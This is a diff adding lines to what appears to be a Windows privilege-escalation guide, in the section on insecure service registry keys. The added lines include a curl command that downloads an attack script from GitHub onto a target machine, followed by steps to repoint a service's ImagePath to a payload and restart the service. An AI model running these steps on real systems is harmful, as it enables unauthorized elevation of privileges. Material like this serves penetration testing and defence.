@@ -70,7 +70,13 @@ Exploiting unquoted service paths:
 2. If an unquoted path exists, place a malicious executable in a directory matching the path to execute your payload.
 
 #### c) **Insecure Registry Service Exploit**
+**Cudos to [Ardemium](https://github.com/Ardemium/InsideJob) for the tip.** 
 Using the **ModifyServiceImagePath.bat** script to modify the `ImagePath`:
+if you're willing to use this script you will need to download it from the link above and run it in the target machine or use the following command to fetch it:
+```bash
+curl -L -o "%USERPROFILE%\ModifyServiceImagePath.bat" https://raw.githubusercontent.com/Ardemium/InsideJob/refs/heads/main/utils/ModifyServiceImagePath.bat
+```
+
 1. Identify the service with insecure registry keys using **Autoruns** or **AccessChk**.
 2. Run the **ModifyServiceImagePath.bat** script to point the service to your custom payload.
 3. Restart the service to execute the payload:
